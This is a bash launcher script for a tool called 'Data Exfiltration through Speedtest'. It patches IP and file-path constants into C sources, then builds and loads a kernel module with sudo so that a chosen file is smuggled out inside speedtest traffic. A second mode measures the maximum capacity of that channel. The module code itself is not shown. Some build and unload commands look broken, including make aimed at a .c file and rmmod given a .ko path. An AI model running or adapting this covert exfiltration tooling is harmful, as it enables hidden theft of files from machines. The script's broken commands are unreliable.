#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
ITALIC='\033[3m'
SPEEDTEST_PURPLE='\033[38;2;139;92;246m'
NC='\033[0m'

echo -e "${BOLD}${SPEEDTEST_PURPLE}╔════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  Data Exfiltration through Speedtest   ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  ${DIM}${ITALIC}Author: Janessa Palmieri${NC}${BOLD}${SPEEDTEST_PURPLE}              ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}╚════════════════════════════════════════╝${NC}"

trap 'echo -e "\n${RED}Error: something went wrong. Cleaning up...${NC}" >&2; sudo rmmod speedtest_exfil 2>/dev/null; make clean 2>/dev/null; exit 1' ERR
set -e

# Check dependencies
echo -e "\n${YELLOW}Checking dependencies...${NC}"

deps_ok=true
command -v make &>/dev/null || { echo -e "${RED}Missing: make${NC}"; deps_ok=false; }
command -v gcc &>/dev/null || { echo -e "${RED}Missing: gcc${NC}"; deps_ok=false; }
[ -d "/lib/modules/$(uname -r)/build" ] || { echo -e "${RED}Missing: linux kernel headers${NC}"; deps_ok=false; }
command -v speedtest &>/dev/null || { echo -e "${RED}Missing: speedtest-cli${NC}"; deps_ok=false; }

if [ "$deps_ok" = false ]; then
    echo -e "${RED}Please install missing dependencies and try again.${NC}"
    exit 1
fi

echo -e "${GREEN}All dependencies found.${NC}"

# Detect client IP
source_ip=$(ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
echo -e "${YELLOW}Using SOURCE_IP: $source_ip${NC}"

# Function selection
echo ""
echo -e "${BOLD}Select function to run:${NC}"
echo "1) Calculate max exfiltration capacity"
echo "2) Exfiltrate a file"
read -p "Enter 1 or 2: " choice

if [ "$choice" == "1" ]; then
    # Modify constants in C file
    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.c
   
    # Build and load
    echo ""
    echo -e "${YELLOW}Building...${NC}"
    make -C ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.c

    echo -e "${YELLOW}Loading LKM...${NC}"
    sudo insmod ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko

    echo ""
    echo -e "${GREEN}Running speedtest...${NC}"
    speedtest
    sudo rmmod ~/speedtest-data-exfil/max-exfil/speedtest-max-exfil.ko && make clean
elif [ "$choice" == "2" ]; then
    # Modify constants in C file
    sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c

    read -p "Enter TEST_FILE path (e.g. /home/user/secret.txt): " test_file
    sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c
    
    # Build and load
    echo ""
    echo -e "${YELLOW}Building...${NC}"
    make -C ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.c

    echo -e "${YELLOW}Loading LKM...${NC}"
    sudo insmod ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko

    echo ""
    echo -e "${GREEN}Running speedtest...${NC}"
    speedtest
    sudo rmmod ~/speedtest-data-exfil/test-exfil/speedtest-test-exfil.ko && make clean
else
    echo -e "${RED}Invalid choice. Exiting.${NC}"
    exit 1
fi

if [ "$choice" == "1" ]; then
    echo ""
    echo -e "${BOLD}${SPEEDTEST_PURPLE}Total exfil output:${NC}"
    sudo dmesg | tail -1
fi
